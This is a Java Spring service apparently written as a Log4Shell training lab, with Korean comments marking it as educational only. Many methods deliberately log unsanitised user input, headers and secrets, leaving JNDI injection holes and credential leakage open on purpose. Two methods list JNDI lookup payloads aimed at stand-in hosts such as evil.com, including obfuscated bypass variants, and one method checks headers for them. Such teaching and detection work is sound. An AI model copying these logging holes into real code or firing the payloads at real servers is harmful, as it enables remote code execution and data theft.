package com.example.demo.api.vulnerability.service;

import com.example.demo.entity.jpa.user.UserActivity;
import com.example.demo.repo.jpa.user.UserActivityRepository;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;
import org.springframework.stereotype.Service;

import javax.servlet.http.HttpServletRequest;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;

/**
 * Log4j 취약점 실습 전용 서비스
 * ⚠️ 교육 목적으로만 사용! 실제 운영 환경에서는 사용 금지
 */
@Service
@RequiredArgsConstructor
@Log4j2
public class VulnerabilityService {

    private final UserActivityRepository userActivityRepository;

    /**
     * 🚨 취약한 로깅 - 사용자 입력을 필터링 없이 직접 로깅
     */
    public void logUserInput(String userInput, HttpServletRequest request) {
        // JNDI Injection 취약점 - 사용자 입력을 그대로 로깅
        log.info("User input received: {}", userInput);
        log.info("User input details - Value: {}, Length: {}, From IP: {}", 
                userInput, userInput.length(), getClientIpAddress(request));
        
        // 활동 기록
        UserActivity activity = UserActivity.builder()
                .username(getCurrentUsername(request))
                .activity("VULNERABLE_INPUT")
                .ipAddress(getClientIpAddress(request))
                .userAgent(request.getHeader("User-Agent"))
                .details("Input: " + userInput)
                .success(true)
                .build();
        userActivityRepository.save(activity);
    }

    /**
     * 🚨 취약한 헤더 로깅 - HTTP 헤더를 필터링 없이 로깅
     */
    public void logHttpHeaders(HttpServletRequest request) {
        Enumeration<String> headerNames = request.getHeaderNames();
        Map<String, String> headers = new HashMap<>();
        
        while (headerNames.hasMoreElements()) {
            String headerName = headerNames.nextElement();
            String headerValue = request.getHeader(headerName);
            headers.put(headerName, headerValue);
            
            // 🚨 각 헤더를 개별적으로 로깅 (JNDI Injection 가능)
            log.info("HTTP Header - {}: {}", headerName, headerValue);
        }
        
        // 🚨 User-Agent 특별 로깅
        String userAgent = request.getHeader("User-Agent");
        if (userAgent != null) {
            log.info("Processing request from User-Agent: {}", userAgent);
            log.debug("User-Agent details: {}", userAgent);
        }
        
        // 🚨 X-Forwarded-For 로깅
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null) {
            log.info("X-Forwarded-For header: {}", xForwardedFor);
        }
        
        // 🚨 Referer 로깅
        String referer = request.getHeader("Referer");
        if (referer != null) {
            log.info("Request referer: {}", referer);
        }
    }

    /**
     * 🚨 취약한 에러 로깅 - 에러 메시지에 사용자 입력 포함
     */
    public void logError(String errorMessage, String userInput, HttpServletRequest request) {
        // 에러 메시지에 사용자 입력이 포함되어 JNDI Injection 발생 가능
        log.error("Error occurred while processing user input '{}': {}", userInput, errorMessage);
        log.error("Error details - Input: {}, IP: {}, User-Agent: {}", 
                userInput, getClientIpAddress(request), request.getHeader("User-Agent"));
        
        // 스택 트레이스에도 사용자 입력 포함
        try {
            throw new RuntimeException("Processing failed for input: " + userInput);
        } catch (RuntimeException e) {
            log.error("Exception with user input: {}", userInput, e);
        }
    }

    /**
     * 🚨 취약한 검색 로깅 - 검색어 패턴 분석 시 로깅
     */
    public void analyzeSearchPattern(String searchTerm, HttpServletRequest request) {
        // 검색어 패턴 분석
        log.info("Analyzing search pattern: {}", searchTerm);
        
        // 특수 문자 검사 (취약한 로깅)
        if (searchTerm.contains("$")) {
            log.warn("Search term contains special character '$': {}", searchTerm);
        }
        
        if (searchTerm.contains("{")) {
            log.warn("Search term contains special character '{{': {}", searchTerm);
        }
        
        if (searchTerm.contains("jndi")) {
            log.warn("Search term contains 'jndi': {}", searchTerm);
        }
        
        if (searchTerm.contains("ldap")) {
            log.warn("Search term contains 'ldap': {}", searchTerm);
        }
        
        // 검색어 길이별 분류 로깅
        if (searchTerm.length() > 50) {
            log.info("Long search term detected: {}", searchTerm);
        }
        
        // 검색어를 대소문자 변환하여 로깅
        log.debug("Search term variations - Lower: {}, Upper: {}", 
                searchTerm.toLowerCase(), searchTerm.toUpperCase());
    }

    /**
     * 🚨 취약한 파일 업로드 로깅
     */
    public void logFileUpload(String fileName, String fileContent, HttpServletRequest request) {
        log.info("File upload - Name: {}, Size: {}, From: {}", 
                fileName, fileContent.length(), getClientIpAddress(request));
        
        // 파일 내용 미리보기 로깅 (JNDI Injection 가능)
        String preview = fileContent.length() > 100 ? 
                fileContent.substring(0, 100) : fileContent;
        log.info("File content preview: {}", preview);
        
        // 파일명 분석 로깅
        log.debug("File name analysis: {}", fileName);
    }

    /**
     * 🔍 JNDI 공격 패턴 시뮬레이션 (교육용)
     */
    public void simulateJndiAttack() {
        // 일반적인 JNDI 공격 패턴들을 로깅하여 취약점 시연
        String[] attackPatterns = {
                "${jndi:ldap://evil.com/exploit}",
                "${jndi:rmi://malicious.server/payload}",
                "${jndi:dns://attacker.com/exfiltrate}",
                "${${lower:jndi}:${lower:ldap}://evil.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}"
        };
        
        log.warn("=== JNDI Attack Pattern Simulation (FOR EDUCATIONAL PURPOSES) ===");
        for (String pattern : attackPatterns) {
            // 🚨 실제로 JNDI Injection이 발생하는 로깅
            log.info("Simulating attack pattern: {}", pattern);
        }
        log.warn("=== End of Simulation ===");
    }

    /**
     * 🔍 보안 모니터링 - 실시간 공격 탐지
     */
    public void detectRealTimeAttacks(HttpServletRequest request) {
        String userAgent = request.getHeader("User-Agent");
        String referer = request.getHeader("Referer");
        
        // User-Agent 패턴 검사
        if (userAgent != null && (userAgent.contains("${jndi:") || userAgent.contains("ldap://"))) {
            log.error("🚨 SECURITY ALERT: Potential JNDI attack in User-Agent: {}", userAgent);
        }
        
        // Referer 패턴 검사
        if (referer != null && (referer.contains("${jndi:") || referer.contains("ldap://"))) {
            log.error("🚨 SECURITY ALERT: Potential JNDI attack in Referer: {}", referer);
        }
        
        // 모든 헤더 검사
        Enumeration<String> headerNames = request.getHeaderNames();
        while (headerNames.hasMoreElements()) {
            String headerName = headerNames.nextElement();
            String headerValue = request.getHeader(headerName);
            
            if (headerValue != null && headerValue.contains("${jndi:")) {
                log.error("🚨 SECURITY ALERT: Potential JNDI attack in header {}: {}", 
                        headerName, headerValue);
            }
        }
    }

    /**
     * 🚨 취약한 사용자 정보 로깅
     */
    public void logUserInfo(String username, String email, String additionalInfo, HttpServletRequest request) {
        // 사용자 정보를 그대로 로깅
        log.info("User information - Username: {}, Email: {}, Additional: {}", 
                username, email, additionalInfo);
        
        // 상세 정보 로깅
        log.debug("User details from IP {}: Username='{}', Email='{}', Info='{}'", 
                getClientIpAddress(request), username, email, additionalInfo);
    }

    /**
     * 🚨 취약한 설정 값 로깅
     */
    public void logConfigurationValue(String configKey, String configValue, HttpServletRequest request) {
        // 설정 값을 필터링 없이 로깅
        log.info("Configuration access - Key: {}, Value: {}", configKey, configValue);
        log.debug("Config requested from IP {}: {}={}", 
                getClientIpAddress(request), configKey, configValue);
        
        // 특정 설정 키에 대한 특별 처리
        if (configKey.toLowerCase().contains("password") || configKey.toLowerCase().contains("secret")) {
            log.warn("Sensitive configuration accessed: {} = {}", configKey, configValue);
        }
    }

    /**
     * 🚨 취약한 쿼리 로깅
     */
    public void logDatabaseQuery(String query, String parameters, HttpServletRequest request) {
        // 데이터베이스 쿼리와 파라미터를 그대로 로깅
        log.info("Database query executed: {}", query);
        log.debug("Query parameters: {}", parameters);
        log.debug("Query from IP {}: {} with params: {}", 
                getClientIpAddress(request), query, parameters);
    }

    /**
     * 🚨 취약한 API 응답 로깅
     */
    public void logApiResponse(String endpoint, String responseData, HttpServletRequest request) {
        // API 응답 데이터를 그대로 로깅
        log.info("API response for endpoint {}: {}", endpoint, responseData);
        log.debug("Response to IP {}: {}", getClientIpAddress(request), responseData);
        
        // 응답 크기 로깅
        log.debug("Response size for {}: {} characters", endpoint, responseData.length());
    }

    /**
     * 🚨 취약한 세션 정보 로깅
     */
    public void logSessionInfo(String sessionId, String sessionData, HttpServletRequest request) {
        // 세션 정보를 그대로 로깅
        log.info("Session information - ID: {}, Data: {}", sessionId, sessionData);
        log.debug("Session from IP {}: ID={}, Data={}", 
                getClientIpAddress(request), sessionId, sessionData);
    }

    /**
     * 🚨 멀티 파라미터 로깅 (여러 사용자 입력을 동시에 로깅)
     */
    public void logMultipleInputs(Map<String, String> inputMap, HttpServletRequest request) {
        // 모든 입력값을 개별적으로 로깅
        inputMap.forEach((key, value) -> {
            log.info("Input parameter - {}: {}", key, value);
        });
        
        // 전체 입력 맵을 한번에 로깅
        log.debug("All inputs from IP {}: {}", getClientIpAddress(request), inputMap);
        
        // 입력값들의 조합 로깅
        String combinedInputs = String.join("|", inputMap.values());
        log.debug("Combined input values: {}", combinedInputs);
    }

    /**
     * 🔍 공격 패턴 문자열 생성 (교육용)
     */
    public String[] getCommonAttackPatterns() {
        return new String[]{
                "${jndi:ldap://attacker.com/exploit}",
                "${jndi:rmi://evil.server/payload}",
                "${jndi:dns://malicious.domain/data}",
                "${${lower:jndi}:${lower:ldap}://bypass.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfuscated.com/exploit}",
                "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}",
                "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/exploit}"
        };
    }

    // 유틸리티 메서드
    private String getClientIpAddress(HttpServletRequest request) {
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null && !xForwardedFor.isEmpty()) {
            return xForwardedFor.split(",")[0].trim();
        }
        
        String xRealIp = request.getHeader("X-Real-IP");
        if (xRealIp != null && !xRealIp.isEmpty()) {
            return xRealIp;
        }
        
        return request.getRemoteAddr();
    }

    private String getCurrentUsername(HttpServletRequest request) {
        // 실제 구현에서는 Security Context에서 가져옴
        return request.getRemoteUser() != null ? request.getRemoteUser() : "anonymous";
    }
}
